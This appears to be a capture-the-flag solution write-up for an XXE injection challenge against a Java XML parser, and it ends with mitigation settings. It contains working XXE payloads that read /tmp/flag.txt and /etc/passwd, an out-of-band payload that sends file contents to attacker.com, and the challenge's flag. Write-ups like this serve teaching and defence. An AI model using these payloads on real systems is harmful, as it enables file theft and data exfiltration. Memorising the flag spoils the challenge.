# Challenge 15: XXEReader - Solution

## Vulnerability Type
**XML External Entity (XXE) Injection**

## Description
The application parses XML without disabling external entity processing, allowing attackers to read arbitrary files from the server.

## Vulnerable Code
```java
// VULNERABLE: XXE enabled (no secure factory)
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(new ByteArrayInputStream(xmlInput.getBytes("UTF-8")));
```

## Exploitation Steps

### Step 1: Understand the Target
- The flag is stored at `/tmp/flag.txt`
- The application parses XML and extracts `<name>` elements
- We can define external entities to read files

### Step 2: Craft XXE Payload
```xml
<?xml version="1.0"?>
<!DOCTYPE products [
  <!ENTITY xxe SYSTEM "file:///tmp/flag.txt">
]>
<products>
  <name>&xxe;</name>
</products>
```

### Step 3: Submit the Payload
1. Navigate to the XXEReader application
2. Replace the default XML with the payload above
3. Click "Parse XML"
4. The flag content will be displayed in the `<name>` element output

## Alternative Payloads

### Read /etc/passwd
```xml
<?xml version="1.0"?>
<!DOCTYPE products [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<products>
  <name>&xxe;</name>
</products>
```

### Using Parameter Entities
```xml
<?xml version="1.0"?>
<!DOCTYPE products [
  <!ENTITY % file SYSTEM "file:///tmp/flag.txt">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
  %eval;
  %exfil;
]>
<products>
  <name>test</name>
</products>
```

## Flag
```
FCTF{xxe_r34ds_y0ur_f1l3s}
```

## How It Works
- XML parsers can process Document Type Definitions (DTD)
- DTDs can define external entities that reference files or URLs
- When the entity is used in the XML, the parser fetches and includes the content
- This allows reading arbitrary files the application has access to

## Mitigation
- Disable external entity processing:
  ```java
  DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
  factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
  factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
  factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
  factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
  factory.setXIncludeAware(false);
  factory.setExpandEntityReferences(false);
  ```
- Use less complex data formats (JSON instead of XML)
- Keep XML parsers updated
- Implement input validation
- Use XML libraries with secure defaults
- Apply principle of least privilege for file access
